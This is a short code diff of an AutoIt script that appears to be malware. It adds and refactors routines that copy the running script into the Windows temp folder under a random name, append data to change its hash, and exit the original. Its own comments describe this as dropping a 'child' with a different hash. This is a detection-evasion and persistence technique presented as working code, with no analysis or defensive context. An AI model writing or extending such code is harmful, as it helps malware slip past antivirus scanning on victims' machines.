@@ -70,8 +70,7 @@ Func RandomString()
 EndFunc
 
 ;copy myself into temp changing hash
-Func CopyTempRun()
-   $newName = RandomString()
+Func CopyTempRun($newName = RandomString())
    FileCopy(@ScriptDir & "\" & @ScriptName, @TempDir & "\" & $newName, $FC_OVERWRITE + $FC_CREATEPATH)
    Local $hFileOpen = FileOpen(@TempDir & "\" & $newName, $FO_APPEND)
    If $hFileOpen = -1 Then
@@ -87,4 +86,17 @@ Func isRunningFromTemp()
 	  Return 1
    EndIf
 EndFunc
+
+;if it's not running from temp, drop child to temp with different hash
+Func Move2Temp($newName = RandomString())
+   if (@ScriptDir & "\" & @ScriptName == @TempDir & "\" & @ScriptName) Then
+	  Return 1
+   Else
+	  CopyTempRun($newName)
+	  Exit
+   EndIf
+EndFunc
+
+
+
 
